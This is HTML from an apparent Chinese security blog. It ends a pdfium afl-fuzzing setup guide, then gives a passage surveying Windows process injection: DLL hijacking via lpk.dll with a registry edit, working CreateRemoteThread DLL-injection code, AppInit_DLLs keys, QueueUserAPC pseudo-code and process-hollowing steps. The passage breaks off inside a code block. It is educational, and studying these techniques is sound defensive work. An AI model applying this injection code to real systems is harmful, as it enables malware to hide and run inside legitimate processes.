+<p>使用 ASAN 编译会报错，暂时不开启，接下来要解决 afl 的问题了， pdfium 的 third_party<br>中不包含 afl-fuzz 的源代码，需要到 chromium.googlesource.com 项目下载。<br>chromium 项目支持 libfuzzer 和 afl-fuzz，只要使用开关， <code>use_libfuzzer = true</code><br>或者 <code>use_afl = true</code> 即可打开。</p>
+<p>要编译生成 pdfium_test, 必须指定 pdf_is_standalone = true, pdfium 源码仓库中没有<br>afl-fuzz 的代码，需要自己下载。</p>
+<p><a href="https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</a></p>
+<p>可以直接下载 .tgz 文件<br><a href="https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz</a></p>
+<p>下载后将源码 copy 到 ~/repo/pdfium/third_party/afl 中, 使用 <code>ninja -C out/afl</code> 编译整个项目。</p>
+<p>使用 <code>is_debug=false</code> 可以明显提高fuzzing 速度，应该开启。另外一个比较有用的是<br><code>symbol_level</code>, 设置 symbol_level=1 可以添加必要的调试符号，便于gdb调试。</p>
+<p>在编译 skia backend 支持时，需要额外处理， 使用 C++14</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use_cxx11 &#x3D; false</span><br></pre></td></tr></table></figure>
+
+<h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><p>随着 chromium 代码的更新， afl 源码编译出现了一些小问题，需要处理。</p>
+<p>src/third_party/afl/patches/0001-fix-build-with-std-c11.patch</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/afl-fuzz.c b/afl-fuzz.c</span><br><span class="line">index 01b4afef0ecc..f0d564a33037 100644</span><br><span class="line"><span class="comment">--- a/afl-fuzz.c</span></span><br><span class="line"><span class="comment">+++ b/afl-fuzz.c</span></span><br><span class="line"><span class="meta">@@ -23,7 +23,9 @@</span></span><br><span class="line"> #define AFL_MAIN</span><br><span class="line"> #define MESSAGES_TO_STDOUT</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#ifndef _GNU_SOURCE</span></span><br><span class="line"> #define _GNU_SOURCE</span><br><span class="line"><span class="addition">+#endif</span></span><br><span class="line"> #define _FILE_OFFSET_BITS 64</span><br><span class="line"> </span><br><span class="line"> #include "config.h"</span><br><span class="line">diff --git a/types.h b/types.h</span><br><span class="line">index 784d3a7a286d..d24d1fdd97e8 100644</span><br><span class="line"><span class="comment">--- a/types.h</span></span><br><span class="line"><span class="comment">+++ b/types.h</span></span><br><span class="line">@@ -78,7 +78,7 @@ typedef int64_t  s64;</span><br><span class="line"> #define STRINGIFY(x) STRINGIFY_INTERNAL(x)</span><br><span class="line"> </span><br><span class="line"> #define MEM_BARRIER() \</span><br><span class="line"><span class="deletion">-  asm volatile("" ::: "memory")</span></span><br><span class="line"><span class="addition">+  __asm__ volatile("" ::: "memory")</span></span><br><span class="line"> </span><br><span class="line"> #define likely(_x)   __builtin_expect(!!(_x), 1)</span><br><span class="line"> #define unlikely(_x)  __builtin_expect(!!(_x), 0)</span><br></pre></td></tr></table></figure>
+
+<p>afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取：</p>
+<ul>
+<li><a href="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/" target="_blank" rel="noopener">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li>
+<li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs" target="_blank" rel="noopener">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li>
+</ul>
+<p><code>./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@</code></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html" target="_blank" rel="noopener">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li>
+<li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md</a></li>
+<li><a href="https://fuzzing-project.org/tutorial2.html" target="_blank" rel="noopener">https://fuzzing-project.org/tutorial2.html</a></li>
+<li><a href="https://blog.chromium.org/2012/04/fuzzing-for-security.html" target="_blank" rel="noopener">https://blog.chromium.org/2012/04/fuzzing-for-security.html</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md</a></li>
+<li><a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF" target="_blank" rel="noopener">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li>
+<li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html" target="_blank" rel="noopener">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li>
+<li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html" target="_blank" rel="noopener">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/process_injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/process_injection/" class="post-title-link" itemprop="url">Windows 进程注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p>
+<h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HOOKPROC lpfn,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HINSTANCE hMod,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dwThread 为0，将监管系统中所有线程。</li>
+<li>idHook        指定监控event的类型</li>
+<li>hMod          dll句柄</li>
+<li>lpfn          hook例程的指针</li>
+</ul>
+<p>MSDN给出了一个使用的例子：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOOKPROC hkprcSysMsg;</span><br><span class="line"><span class="keyword">static</span> HINSTANCE hinstDLL; </span><br><span class="line"><span class="keyword">static</span> HHOOK hhookSysMsg; </span><br><span class="line"> </span><br><span class="line">hinstDLL = LoadLibrary(TEXT(<span class="string">"c:\\myapp\\sysmsg.dll"</span>)); </span><br><span class="line">hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, <span class="string">"SysMessageProc"</span>); </span><br><span class="line"></span><br><span class="line">hhookSysMsg = SetWindowsHookEx( </span><br><span class="line">                    WH_SYSMSGFILTER,</span><br><span class="line">                    hkprcSysMsg,</span><br><span class="line">                    hinstDLL,</span><br><span class="line">                    <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p>
+<h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p>
+<p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p>
+<p>  这里有二个问题，值得思考。</p>
+<h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p>
+<p> <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. The directory from which the application loaded.</span><br><span class="line">b. The current directory.</span><br><span class="line">c. The system directory. Use the GetSystemDirectory function to get the path of this directory.</span><br><span class="line">d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</span><br><span class="line">e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</span><br><span class="line">f. The directories that are listed in the PATH environment variable. Note that</span><br><span class="line">   this does not include the per-application path specified by the App</span><br><span class="line">   Paths registry key. The App Paths key is not used when computing the DLL</span><br><span class="line">   search path.</span><br></pre></td></tr></table></figure>
+<p>因此把lpk.dll放到运行的程序同一目录即可。</p>
+<h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]</span><br><span class="line">&quot;ExcludeFromKnownDlls&quot;&#x3D;hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   HANDLE hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_   DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">_Out_  LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>hProcess        要注入的进程的句柄</li>
+<li>lpStartAddress  远程进程中执行的函数的地址（指针）</li>
+<li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li>
+</ul>
+<h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p>
+<p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p>
+<p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p>
+<p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error: the specified process couldn't be found.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get address of the LoadLibrary function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error: the LoadLibraryA function was not found inside kernel32.dll library.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Allocate new memory region inside the process's address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID arg = (LPVOID)VirtualAllocEx(process, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error: the memory could not be allocated inside the chosen process.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Write the argument to LoadLibraryA to the process's newly allocated memory region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> n = WriteProcessMemory(process, arg, buffer, <span class="built_in">strlen</span>(buffer), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error: there was no bytes written to the process's address space.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Inject our DLL into the process's address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE threadID = CreateRemoteThread(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (threadID == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error: the remote thread could not be created.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Success: the remote thread was successfully created.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Close the handle to the process, becuase we've already injected the DLL.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">CloseHandle(process);</span><br></pre></td></tr></table></figure>
+
+<p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p>
+<p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p>
+<h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p>
+<ol>
+<li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li>
+<li>RtlCreateUserThread </li>
+</ol>
+<h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p>
+<p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p>
+<p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p>
+<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p>
+<ul>
+<li>REG_DWORD 1 表示全局开启</li>
+<li>REG_DWORD 0 表示全局关闭</li>
+</ul>
+<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p>
+<ul>
+<li>REG_DWORD 0 加载任意DLL</li>
+<li>REG_DWORD 1 只加载签名的DLL</li>
+</ul>
+<h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p>
+<p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    // APC function<br>  <em>In</em>  HANDLE hThread,     // handle of thread<br>  <em>In</em>  ULONG_PTR dwData    // APc function parameter<br>);</p>
+<p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p>
+<p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p>
+<p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p>
+<p>核心伪代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD ret;</span><br><span class="line">char *DllName = 'c:\\MyDll.dll';</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">PVOID param = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;</span><br><span class="line">  <span class="keyword">for</span> (DWORD p = <span class="number">0</span>; p &lt; NumberOfThreads; p ++) &#123;</span><br><span class="line">    hThread = OpenThread(THREAD_ALL_ACCESS, <span class="number">0</span>, ThreadId[p]);</span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="number">0</span>) &#123;</span><br><span class="line">      InjectDll(hProcess, hThread, (DWORD)param);</span><br><span class="line">      CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InjectDll</span><span class="params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;</span><br><span class="line">  QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle('kernel32.dll', 'LoadLibraryA', hThread, (DWORD)param）;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p>
+<p>基本步骤如下：</p>
+<ol>
+<li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li>
+<li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li>
+<li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li>
+<li>使用WriteProcessMemory在分配区域内写入恶意代码</li>
+<li>使用SetThreadContext设置线程内容为指定的恶意代码</li>
+<li>使用ResumeThread回复进程执行</li>
+</ol>
+<p>代码中用到PEB的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dt nt!_PEB</span><br><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged : UChar</span><br><span class="line">+0x003 SpareBool : UChar</span><br><span class="line">+0x004 Mutant : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br></pre></td></tr></table></figure>
+<p>示例代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 